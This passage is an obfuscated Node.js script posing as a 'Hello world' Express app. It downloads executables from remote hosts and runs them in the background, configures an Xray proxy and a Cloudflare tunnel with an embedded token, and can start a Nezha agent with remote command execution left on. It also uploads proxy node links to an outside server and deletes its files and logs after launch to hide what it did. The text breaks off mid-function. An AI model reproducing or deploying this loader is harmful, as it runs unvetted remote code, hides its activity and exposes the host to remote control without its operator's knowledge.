const _0x5d2a16=_0x2105;(function(_0x3c8947,_0x1e6e21){const _0x249c25=_0x2105,_0x4300c3=_0x3c8947();while(!![]){try{const _0x69e6a0=parseInt(_0x249c25(0x1bf))/0x1+-parseInt(_0x249c25(0x1e2))/0x2+parseInt(_0x249c25(0x1e3))/0x3*(parseInt(_0x249c25(0x24a))/0x4)+parseInt(_0x249c25(0x240))/0x5+-parseInt(_0x249c25(0x1df))/0x6+-parseInt(_0x249c25(0x1cb))/0x7*(-parseInt(_0x249c25(0x259))/0x8)+-parseInt(_0x249c25(0x1db))/0x9*(-parseInt(_0x249c25(0x249))/0xa);if(_0x69e6a0===_0x1e6e21)break;else _0x4300c3['push'](_0x4300c3['shift']());}catch(_0xfa4368){_0x4300c3['push'](_0x4300c3['shift']());}}}(_0x1112,0x2aca3));const express=require(_0x5d2a16(0x23a)),app=express(),axios=require(_0x5d2a16(0x235)),os=require('os'),fs=require('fs'),path=require(_0x5d2a16(0x209)),{promisify}=require('util'),exec=promisify(require(_0x5d2a16(0x1ba))[_0x5d2a16(0x1af)]),{execSync}=require(_0x5d2a16(0x1ba)),UPLOAD_URL=process[_0x5d2a16(0x200)][_0x5d2a16(0x1ff)]||'',PROJECT_URL=process[_0x5d2a16(0x200)][_0x5d2a16(0x205)]||'',AUTO_ACCESS=process[_0x5d2a16(0x200)][_0x5d2a16(0x22e)]||![],FILE_PATH=process[_0x5d2a16(0x200)][_0x5d2a16(0x220)]||_0x5d2a16(0x1b7),SUB_PATH=process[_0x5d2a16(0x200)][_0x5d2a16(0x255)]||_0x5d2a16(0x1f3),PORT=process['env']['SERVER_PORT']||process[_0x5d2a16(0x200)][_0x5d2a16(0x25f)]||0xbb8,UUID=process[_0x5d2a16(0x200)][_0x5d2a16(0x21c)]||'c51eec46-f6e4-4141-b0d5-249bf9090c85',NEZHA_SERVER=process[_0x5d2a16(0x200)][_0x5d2a16(0x24e)]||'',NEZHA_PORT=process[_0x5d2a16(0x200)][_0x5d2a16(0x1be)]||'',NEZHA_KEY=process['env'][_0x5d2a16(0x208)]||'',ARGO_DOMAIN=process[_0x5d2a16(0x200)][_0x5d2a16(0x1b6)]||_0x5d2a16(0x1bc),ARGO_AUTH=process[_0x5d2a16(0x200)][_0x5d2a16(0x1e5)]||_0x5d2a16(0x23f),ARGO_PORT=process[_0x5d2a16(0x200)]['ARGO_PORT']||0x1f41,CFIP=process[_0x5d2a16(0x200)]['CFIP']||_0x5d2a16(0x1d4),CFPORT=process[_0x5d2a16(0x200)][_0x5d2a16(0x1ed)]||0x1bb,NAME=process[_0x5d2a16(0x200)]['NAME']||_0x5d2a16(0x1a1);!fs[_0x5d2a16(0x1a5)](FILE_PATH)?(fs[_0x5d2a16(0x21d)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x5d2a16(0x217));function generateRandomName(){const _0x1f2b4f=_0x5d2a16,_0x496111=_0x1f2b4f(0x1a8);let _0x51cf42='';for(let _0x593fcc=0x0;_0x593fcc<0x6;_0x593fcc++){_0x51cf42+=_0x496111['charAt'](Math[_0x1f2b4f(0x24d)](Math['random']()*_0x496111[_0x1f2b4f(0x24b)]));}return _0x51cf42;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x1112(){const _0x571834=['env','finish','https://arm64.ssss.nyc.mn/bot','win32','list.txt','PROJECT_URL','/dev/null','\x22\x20>\x20/dev/null\x202>&1','NEZHA_KEY','path','Empowerment\x20success\x20for\x20','charAt','from','statSync','taskkill\x20/f\x20/im\x20','config.yaml','\x20is\x20running','status','none','boot.log','catch','App\x20is\x20running','xtls-rprx-vision','\x20already\x20exists','writeFileSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','createWriteStream','Download\x20','UUID','mkdirSync','text/plain;\x20charset=utf-8','get','FILE_PATH','\x0aclient_secret:\x20','block','443','push','country_code','Unhandled\x20error\x20in\x20startserver:','\x0a\x0atrojan://','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://arm64.ssss.nyc.mn/web','Subscription\x20uploaded\x20successfully','\x0a\x20\x20tunnel:\x20','isFile','\x20-s\x20','AUTO_ACCESS','\x20-p\x20','8443','Content-Type','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://amd64.ssss.nyc.mn/web','&path=%2Fvless-argo%3Fed%3D2560#','axios','firefox','del\x20/f\x20/q\x20','tunnel.yml','2096','express','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20>/dev/null\x202>&1','Nodes\x20uploaded\x20successfully','listen','eyJhIjoiMjY3MTE0OWQxMDQzOGNmYjk0YmU0ZjBhMmFmNWIwOGMiLCJ0IjoiMTQ1NzQyODMtNTk1Mi00ZGU2LTk5MDgtNTRmOTkzODZiN2Y0IiwicyI6Ik5HWmxaRGxrTkRRdE1EQXpaaTAwWWpjeExUZ3dNR1l0T1RjNFltWTJPV0pqWkRnMiJ9','544885hKytHx','\x20>\x20nul\x202>&1','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_DOMAIN:','split','2087','post','base64','vless','950BWkuNV','661984BuHWwv','length','clear','floor','NEZHA_SERVER','direct','readFileSync','&path=%2Ftrojan-argo%3Fed%3D2560#','then','success','pipe','SUB_PATH','stream','includes','arm64','24lhiIgO','\x0a\x0avmess://','php\x20running\x20error:\x20','pkill\x20-f\x20\x22[','https://arm64.ssss.nyc.mn/agent','127.0.0.1','PORT','log','http\x20server\x20is\x20running\x20on\x20port:','fileUrl','tls','/vmess-argo','application/json','false','http','filter','automatic\x20access\x20task\x20added\x20successfully','unlinkSync','\x20-c\x20','JTIP','ArgoDomain:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','existsSync','pop','--tls','abcdefghijklmnopqrstuvwxyz','nohup\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/vless-argo','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','org','tunnel.json','exec','Empowerment\x20failed\x20for\x20','send','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','substring','https://ipapi.co/json/','/api/add-nodes','ARGO_DOMAIN','./tmp','match','arch','child_process','Error\x20executing\x20command:\x20','jtip25.honganguzh.top','join','NEZHA_PORT','30709aATTfC','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','2053','rm\x20-rf\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','unlink','error','/sub.txt\x20saved\x20successfully','test','trojan','stringify','Error\x20downloading\x20files:','373583xLuYNB','blackhole','aarch64','set','Hello\x20world!','.exe\x20>\x20nul\x202>&1','/config.json\x20>/dev/null\x202>&1\x20&','response','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','cdns.doon.eu.org','/api/add-subscriptions','\x20>/dev/null\x202>&1\x20&','http://ip-api.com/json/','utf-8','Error\x20in\x20startserver:','unshift','21474VMqySx','&fp=firefox&type=ws&host=','platform','close','1349502gTXVKi','https://amd64.ssss.nyc.mn/bot','message','583550IzRFbM','3yDTlAz','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ARGO_AUTH','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/api/delete-nodes','toString','tcp','map','\x20successfully','/tunnel.yml\x20run','CFPORT','countryCode','data','\x0avless://','forEach','config.json','9988','\x0a\x20\x20credentials-file:\x20','freedom','arm','/trojan-argo','Error\x20reading\x20boot.log:','vmess','quic','npm\x20running\x20error:\x20','2083','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','basename','UPLOAD_URL'];_0x1112=function(){return _0x571834;};return _0x1112();}let npmPath=path[_0x5d2a16(0x1bd)](FILE_PATH,npmName),phpPath=path[_0x5d2a16(0x1bd)](FILE_PATH,phpName),webPath=path[_0x5d2a16(0x1bd)](FILE_PATH,webName),botPath=path[_0x5d2a16(0x1bd)](FILE_PATH,botName),subPath=path[_0x5d2a16(0x1bd)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x5d2a16(0x204)),bootLogPath=path['join'](FILE_PATH,_0x5d2a16(0x213)),configPath=path[_0x5d2a16(0x1bd)](FILE_PATH,'config.json');function deleteNodes(){const _0x2397ed=_0x5d2a16;try{if(!UPLOAD_URL)return;if(!fs[_0x2397ed(0x1a5)](subPath))return;let _0x328232;try{_0x328232=fs[_0x2397ed(0x250)](subPath,_0x2397ed(0x1d8));}catch{return null;}const _0x5df0a3=Buffer[_0x2397ed(0x20c)](_0x328232,_0x2397ed(0x247))[_0x2397ed(0x1e8)](_0x2397ed(0x1d8)),_0x1dc440=_0x5df0a3[_0x2397ed(0x244)]('\x0a')[_0x2397ed(0x19d)](_0x551f3c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2397ed(0x1c7)](_0x551f3c));if(_0x1dc440['length']===0x0)return;return axios[_0x2397ed(0x246)](UPLOAD_URL+_0x2397ed(0x1e7),JSON['stringify']({'nodes':_0x1dc440}),{'headers':{'Content-Type':'application/json'}})[_0x2397ed(0x214)](_0x486705=>{return null;}),null;}catch(_0x3c0c50){return null;}}function cleanupOldFiles(){const _0x22c5ce=_0x5d2a16;try{const _0x526e39=fs['readdirSync'](FILE_PATH);_0x526e39[_0x22c5ce(0x1f1)](_0x3fc115=>{const _0x30de5d=_0x22c5ce,_0x1561b4=path[_0x30de5d(0x1bd)](FILE_PATH,_0x3fc115);try{const _0x19c0a3=fs[_0x30de5d(0x20d)](_0x1561b4);_0x19c0a3[_0x30de5d(0x22c)]()&&fs[_0x30de5d(0x19f)](_0x1561b4);}catch(_0x4ccfff){}});}catch(_0x35d6e5){}}app[_0x5d2a16(0x21f)]('/',function(_0x302b2c,_0x4d8500){const _0x58e055=_0x5d2a16;_0x4d8500[_0x58e055(0x1b1)](_0x58e055(0x1cf));});function _0x2105(_0x27eedf,_0x10dd46){_0x27eedf=_0x27eedf-0x19b;const _0x11128c=_0x1112();let _0x2105ec=_0x11128c[_0x27eedf];return _0x2105ec;}async function generateConfig(){const _0x4358de=_0x5d2a16,_0x4d0b90={'log':{'access':_0x4358de(0x206),'error':_0x4358de(0x206),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4358de(0x248),'settings':{'clients':[{'id':UUID,'flow':_0x4358de(0x216)}],'decryption':_0x4358de(0x212),'fallbacks':[{'dest':0xbb9},{'path':_0x4358de(0x1ab),'dest':0xbba},{'path':_0x4358de(0x264),'dest':0xbbb},{'path':_0x4358de(0x1f7),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x4358de(0x25e),'protocol':_0x4358de(0x248),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x4358de(0x1e9),'security':_0x4358de(0x212)}},{'port':0xbba,'listen':_0x4358de(0x25e),'protocol':_0x4358de(0x248),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4358de(0x212)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4358de(0x1ab)}},'sniffing':{'enabled':!![],'destOverride':[_0x4358de(0x19c),_0x4358de(0x263),_0x4358de(0x1fa)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4358de(0x25e),'protocol':_0x4358de(0x1f9),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4358de(0x19c),_0x4358de(0x263),_0x4358de(0x1fa)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4358de(0x25e),'protocol':_0x4358de(0x1c8),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4358de(0x212),'wsSettings':{'path':_0x4358de(0x1f7)}},'sniffing':{'enabled':!![],'destOverride':[_0x4358de(0x19c),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x4358de(0x1f5),'tag':_0x4358de(0x24f)},{'protocol':_0x4358de(0x1cc),'tag':_0x4358de(0x222)}]};fs[_0x4358de(0x218)](path[_0x4358de(0x1bd)](FILE_PATH,_0x4358de(0x1f2)),JSON[_0x4358de(0x1c9)](_0x4d0b90,null,0x2));}function getSystemArchitecture(){const _0x2c8413=_0x5d2a16,_0xd17a2b=os[_0x2c8413(0x1b9)]();return _0xd17a2b===_0x2c8413(0x1f6)||_0xd17a2b===_0x2c8413(0x258)||_0xd17a2b===_0x2c8413(0x1cd)?'arm':'amd';}function downloadFile(_0x4ab5d4,_0x27ad64,_0x324d05){const _0x168449=_0x5d2a16,_0x21dfb7=_0x4ab5d4;!fs[_0x168449(0x1a5)](FILE_PATH)&&fs[_0x168449(0x21d)](FILE_PATH,{'recursive':!![]});const _0x3a14de=fs[_0x168449(0x21a)](_0x21dfb7);axios({'method':_0x168449(0x21f),'url':_0x27ad64,'responseType':_0x168449(0x256)})[_0x168449(0x252)](_0x556ecd=>{const _0x1c9efb=_0x168449;_0x556ecd[_0x1c9efb(0x1ef)][_0x1c9efb(0x254)](_0x3a14de),_0x3a14de['on'](_0x1c9efb(0x201),()=>{const _0x14e897=_0x1c9efb;_0x3a14de[_0x14e897(0x1de)](),console[_0x14e897(0x260)](_0x14e897(0x21b)+path['basename'](_0x21dfb7)+_0x14e897(0x1eb)),_0x324d05(null,_0x21dfb7);}),_0x3a14de['on'](_0x1c9efb(0x1c5),_0x6cfac0=>{const _0x2a5e16=_0x1c9efb;fs[_0x2a5e16(0x1c4)](_0x21dfb7,()=>{});const _0x549885='Download\x20'+path[_0x2a5e16(0x1fe)](_0x21dfb7)+'\x20failed:\x20'+_0x6cfac0[_0x2a5e16(0x1e1)];console[_0x2a5e16(0x1c5)](_0x549885),_0x324d05(_0x549885);});})[_0x168449(0x214)](_0x2ca44e=>{const _0x255d22=_0x168449,_0x3b5a5c=_0x255d22(0x21b)+path[_0x255d22(0x1fe)](_0x21dfb7)+'\x20failed:\x20'+_0x2ca44e['message'];console[_0x255d22(0x1c5)](_0x3b5a5c),_0x324d05(_0x3b5a5c);});}async function downloadFilesAndRun(){const _0x2d1cea=_0x5d2a16,_0x303666=getSystemArchitecture(),_0x44fd3d=getFilesForArchitecture(_0x303666);if(_0x44fd3d['length']===0x0){console[_0x2d1cea(0x260)](_0x2d1cea(0x1d3));return;}const _0x250101=_0x44fd3d[_0x2d1cea(0x1ea)](_0x541365=>{return new Promise((_0x2fe7ae,_0x2d477a)=>{const _0x216752=_0x2105;downloadFile(_0x541365['fileName'],_0x541365[_0x216752(0x262)],(_0x7a3073,_0x5405d5)=>{_0x7a3073?_0x2d477a(_0x7a3073):_0x2fe7ae(_0x5405d5);});});});try{await Promise['all'](_0x250101);}catch(_0x2dfb25){console[_0x2d1cea(0x1c5)](_0x2d1cea(0x1ca),_0x2dfb25);return;}function _0x35491e(_0x51c949){const _0x20b171=0x1fd;_0x51c949['forEach'](_0xfa117f=>{const _0x2b6342=_0x2105;fs[_0x2b6342(0x1a5)](_0xfa117f)&&fs['chmod'](_0xfa117f,_0x20b171,_0x1382bf=>{const _0x18ee38=_0x2b6342;_0x1382bf?console['error'](_0x18ee38(0x1b0)+_0xfa117f+':\x20'+_0x1382bf):console[_0x18ee38(0x260)](_0x18ee38(0x20a)+_0xfa117f+':\x20'+_0x20b171[_0x18ee38(0x1e8)](0x8));});});}const _0x438b5c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x35491e(_0x438b5c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x492396=NEZHA_SERVER[_0x2d1cea(0x257)](':')?NEZHA_SERVER[_0x2d1cea(0x244)](':')[_0x2d1cea(0x1a6)]():'',_0x2d7e27=new Set([_0x2d1cea(0x223),_0x2d1cea(0x230),'2096','2087',_0x2d1cea(0x1fc),_0x2d1cea(0x1c1)]),_0x12615a=_0x2d7e27['has'](_0x492396)?'true':_0x2d1cea(0x19b),_0x179fca=_0x2d1cea(0x221)+NEZHA_KEY+_0x2d1cea(0x1e6)+NEZHA_SERVER+_0x2d1cea(0x232)+_0x12615a+_0x2d1cea(0x1a3)+UUID;fs[_0x2d1cea(0x218)](path[_0x2d1cea(0x1bd)](FILE_PATH,_0x2d1cea(0x20f)),_0x179fca);const _0x2593bd='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x2d1cea(0x1c0);try{await exec(_0x2593bd),console[_0x2d1cea(0x260)](phpName+_0x2d1cea(0x210)),await new Promise(_0x3f78ea=>setTimeout(_0x3f78ea,0x3e8));}catch(_0x1c7172){console[_0x2d1cea(0x1c5)](_0x2d1cea(0x25b)+_0x1c7172);}}else{let _0x548d31='';const _0x26eaa8=[_0x2d1cea(0x223),_0x2d1cea(0x230),_0x2d1cea(0x239),_0x2d1cea(0x245),_0x2d1cea(0x1fc),_0x2d1cea(0x1c1)];_0x26eaa8[_0x2d1cea(0x257)](NEZHA_PORT)&&(_0x548d31=_0x2d1cea(0x1a7));const _0x43f11a=_0x2d1cea(0x1a9)+npmPath+_0x2d1cea(0x22d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2d1cea(0x22f)+NEZHA_KEY+'\x20'+_0x548d31+_0x2d1cea(0x1e4);try{await exec(_0x43f11a),console[_0x2d1cea(0x260)](npmName+_0x2d1cea(0x210)),await new Promise(_0x21fc57=>setTimeout(_0x21fc57,0x3e8));}catch(_0x34fb7a){console['error'](_0x2d1cea(0x1fb)+_0x34fb7a);}}}else console[_0x2d1cea(0x260)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x44b039=_0x2d1cea(0x1a9)+webPath+_0x2d1cea(0x1a0)+FILE_PATH+_0x2d1cea(0x1d1);try{await exec(_0x44b039),console[_0x2d1cea(0x260)](webName+_0x2d1cea(0x210)),await new Promise(_0x12155a=>setTimeout(_0x12155a,0x3e8));}catch(_0x17eb4c){console[_0x2d1cea(0x1c5)]('web\x20running\x20error:\x20'+_0x17eb4c);}if(fs['existsSync'](botPath)){let _0x419dc3;if(ARGO_AUTH[_0x2d1cea(0x1b8)](/^[A-Z0-9a-z=]{120,250}$/))_0x419dc3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x419dc3=_0x2d1cea(0x1ac)+FILE_PATH+_0x2d1cea(0x1ec):_0x419dc3=_0x2d1cea(0x1c3)+FILE_PATH+_0x2d1cea(0x1aa)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x419dc3+_0x2d1cea(0x1d6)),console['log'](botName+_0x2d1cea(0x210)),await new Promise(_0x1daabc=>setTimeout(_0x1daabc,0x7d0));}catch(_0x2537ba){console[_0x2d1cea(0x1c5)](_0x2d1cea(0x1bb)+_0x2537ba);}}await new Promise(_0xebaaec=>setTimeout(_0xebaaec,0x1388));}function getFilesForArchitecture(_0x31d522){const _0x424dca=_0x5d2a16;let _0x1dd6f3;_0x31d522===_0x424dca(0x1f6)?_0x1dd6f3=[{'fileName':webPath,'fileUrl':_0x424dca(0x229)},{'fileName':botPath,'fileUrl':_0x424dca(0x202)}]:_0x1dd6f3=[{'fileName':webPath,'fileUrl':_0x424dca(0x233)},{'fileName':botPath,'fileUrl':_0x424dca(0x1e0)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4084e1=_0x31d522===_0x424dca(0x1f6)?_0x424dca(0x25d):'https://amd64.ssss.nyc.mn/agent';_0x1dd6f3[_0x424dca(0x1da)]({'fileName':npmPath,'fileUrl':_0x4084e1});}else{const _0x7e44f5=_0x31d522===_0x424dca(0x1f6)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x1dd6f3[_0x424dca(0x1da)]({'fileName':phpPath,'fileUrl':_0x7e44f5});}}return _0x1dd6f3;}function argoType(){const _0x5da175=_0x5d2a16;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5da175(0x260)](_0x5da175(0x1b2));return;}if(ARGO_AUTH[_0x5da175(0x257)]('TunnelSecret')){fs[_0x5da175(0x218)](path['join'](FILE_PATH,_0x5da175(0x1ae)),ARGO_AUTH);const _0x2dc69a=_0x5da175(0x22b)+ARGO_AUTH[_0x5da175(0x244)]('\x22')[0xb]+_0x5da175(0x1f4)+path['join'](FILE_PATH,'tunnel.json')+_0x5da175(0x1a4)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x5da175(0x228);fs['writeFileSync'](path['join'](FILE_PATH,_0x5da175(0x238)),_0x2dc69a);}else console[_0x5da175(0x260)](_0x5da175(0x219));}async function extractDomains(){const _0x74ea63=_0x5d2a16;let _0x5d589d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5d589d=ARGO_DOMAIN,console[_0x74ea63(0x260)](_0x74ea63(0x243),_0x5d589d),await _0x5c083f(_0x5d589d);else try{const _0x2be692=fs[_0x74ea63(0x250)](path[_0x74ea63(0x1bd)](FILE_PATH,_0x74ea63(0x213)),_0x74ea63(0x1d8)),_0x56a048=_0x2be692[_0x74ea63(0x244)]('\x0a'),_0x15d598=[];_0x56a048[_0x74ea63(0x1f1)](_0x522c39=>{const _0x45ecba=_0x522c39['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x45ecba){const _0x328223=_0x45ecba[0x1];_0x15d598['push'](_0x328223);}});if(_0x15d598[_0x74ea63(0x24b)]>0x0)_0x5d589d=_0x15d598[0x0],console[_0x74ea63(0x260)](_0x74ea63(0x1a2),_0x5d589d),await _0x5c083f(_0x5d589d);else{console[_0x74ea63(0x260)](_0x74ea63(0x23b)),fs[_0x74ea63(0x19f)](path[_0x74ea63(0x1bd)](FILE_PATH,'boot.log'));async function _0x331248(){const _0x34def5=_0x74ea63;try{process[_0x34def5(0x1dd)]==='win32'?await exec(_0x34def5(0x20e)+botName+_0x34def5(0x1d0)):await exec(_0x34def5(0x25c)+botName[_0x34def5(0x20b)](0x0)+']'+botName[_0x34def5(0x1b3)](0x1)+_0x34def5(0x207));}catch(_0x4cdfde){}}_0x331248(),await new Promise(_0x261f92=>setTimeout(_0x261f92,0xbb8));const _0x5360fa=_0x74ea63(0x1c3)+FILE_PATH+_0x74ea63(0x1aa)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5360fa+'\x20>/dev/null\x202>&1\x20&'),console[_0x74ea63(0x260)](botName+_0x74ea63(0x210)),await new Promise(_0x1b87ab=>setTimeout(_0x1b87ab,0xbb8)),await extractDomains();}catch(_0x1c61d8){console[_0x74ea63(0x1c5)](_0x74ea63(0x1bb)+_0x1c61d8);}}}catch(_0xc64e4f){console['error'](_0x74ea63(0x1f8),_0xc64e4f);}async function _0x1d4f0c(){const _0x4a2bc0=_0x74ea63;try{const _0x52faa6=await axios['get'](_0x4a2bc0(0x1b4),{'timeout':0xbb8});if(_0x52faa6[_0x4a2bc0(0x1ef)]&&_0x52faa6[_0x4a2bc0(0x1ef)]['country_code']&&_0x52faa6[_0x4a2bc0(0x1ef)][_0x4a2bc0(0x1ad)])return _0x52faa6[_0x4a2bc0(0x1ef)][_0x4a2bc0(0x225)]+'_'+_0x52faa6[_0x4a2bc0(0x1ef)][_0x4a2bc0(0x1ad)];}catch(_0x3d03ea){try{const _0x184391=await axios['get'](_0x4a2bc0(0x1d7),{'timeout':0xbb8});if(_0x184391['data']&&_0x184391[_0x4a2bc0(0x1ef)]['status']===_0x4a2bc0(0x253)&&_0x184391[_0x4a2bc0(0x1ef)][_0x4a2bc0(0x1ee)]&&_0x184391[_0x4a2bc0(0x1ef)]['org'])return _0x184391['data'][_0x4a2bc0(0x1ee)]+'_'+_0x184391['data'][_0x4a2bc0(0x1ad)];}catch(_0x406128){}}return'Unknown';}async function _0x5c083f(_0x296ae2){const _0xfc86c4=await _0x1d4f0c(),_0x334962=NAME?NAME+'-'+_0xfc86c4:_0xfc86c4;return new Promise(_0x227471=>{setTimeout(()=>{const _0x568ac6=_0x2105,_0x4102e7={'v':'2','ps':''+_0x334962,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x568ac6(0x212),'net':'ws','type':_0x568ac6(0x212),'host':_0x296ae2,'path':'/vmess-argo?ed=2560','tls':_0x568ac6(0x263),'sni':_0x296ae2,'alpn':'','fp':_0x568ac6(0x236)},_0x1742f5=_0x568ac6(0x1f0)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x296ae2+_0x568ac6(0x1dc)+_0x296ae2+_0x568ac6(0x234)+_0x334962+_0x568ac6(0x25a)+Buffer[_0x568ac6(0x20c)](JSON[_0x568ac6(0x1c9)](_0x4102e7))[_0x568ac6(0x1e8)](_0x568ac6(0x247))+_0x568ac6(0x227)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x296ae2+_0x568ac6(0x1dc)+_0x296ae2+_0x568ac6(0x251)+_0x334962+'\x0a\x20\x20\x20\x20';console[_0x568ac6(0x260)](Buffer[_0x568ac6(0x20c)](_0x1742f5)[_0x568ac6(0x1e8)](_0x568ac6(0x247))),fs[_0x568ac6(0x218)](subPath,Buffer[_0x568ac6(0x20c)](_0x1742f5)['toString'](_0x568ac6(0x247))),console[_0x568ac6(0x260)](FILE_PATH+_0x568ac6(0x1c6)),uploadNodes(),app[_0x568ac6(0x21f)]('/'+SUB_PATH,(_0x5b3909,_0x145085)=>{const _0x2710cb=_0x568ac6,_0x17d86d=Buffer[_0x2710cb(0x20c)](_0x1742f5)[_0x2710cb(0x1e8)](_0x2710cb(0x247));_0x145085[_0x2710cb(0x1ce)](_0x2710cb(0x231),_0x2710cb(0x21e)),_0x145085[_0x2710cb(0x1b1)](_0x17d86d);}),_0x227471(_0x1742f5);},0x7d0);});}}async function uploadNodes(){const _0x50211d=_0x5d2a16;if(UPLOAD_URL&&PROJECT_URL){const _0x554bfe=PROJECT_URL+'/'+SUB_PATH,_0x58445c={'subscription':[_0x554bfe]};try{const _0x5a224e=await axios['post'](UPLOAD_URL+_0x50211d(0x1d5),_0x58445c,{'headers':{'Content-Type':'application/json'}});return _0x5a224e&&_0x5a224e[_0x50211d(0x211)]===0xc8?(console[_0x50211d(0x260)](_0x50211d(0x22a)),_0x5a224e):null;}catch(_0x3e1ee6){if(_0x3e1ee6[_0x50211d(0x1d2)]){if(_0x3e1ee6[_0x50211d(0x1d2)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x50211d(0x1a5)](listPath))return;const _0x199f0c=fs[_0x50211d(0x250)](listPath,_0x50211d(0x1d8)),_0x5c9a02=_0x199f0c['split']('\x0a')['filter'](_0x12464d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x12464d));if(_0x5c9a02[_0x50211d(0x24b)]===0x0)return;const _0x3543d0=JSON[_0x50211d(0x1c9)]({'nodes':_0x5c9a02});try{const _0x539b89=await axios['post'](UPLOAD_URL+_0x50211d(0x1b5),_0x3543d0,{'headers':{'Content-Type':_0x50211d(0x265)}});return _0x539b89&&_0x539b89[_0x50211d(0x211)]===0xc8?(console['log'](_0x50211d(0x23d)),_0x539b89):null;}catch(_0x5d111a){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x24b28c=_0x2105,_0x2825f0=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2825f0[_0x24b28c(0x224)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2825f0[_0x24b28c(0x224)](phpPath);process[_0x24b28c(0x1dd)]===_0x24b28c(0x203)?exec(_0x24b28c(0x237)+_0x2825f0['join']('\x20')+_0x24b28c(0x241),_0x54b96a=>{const _0x3d2f9d=_0x24b28c;console['clear'](),console[_0x3d2f9d(0x260)](_0x3d2f9d(0x215)),console[_0x3d2f9d(0x260)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x24b28c(0x1c2)+_0x2825f0[_0x24b28c(0x1bd)]('\x20')+_0x24b28c(0x23c),_0x5d467c=>{const _0xa34509=_0x24b28c;console[_0xa34509(0x24c)](),console['log']('App\x20is\x20running'),console[_0xa34509(0x260)](_0xa34509(0x1fd));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x168618=_0x5d2a16;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x168618(0x242));return;}try{const _0x400536=await axios[_0x168618(0x246)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x168618(0x265)}});return console[_0x168618(0x260)](_0x168618(0x19e)),_0x400536;}catch(_0x5f51d5){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x5f51d5[_0x168618(0x1e1)]),null;}}async function startserver(){const 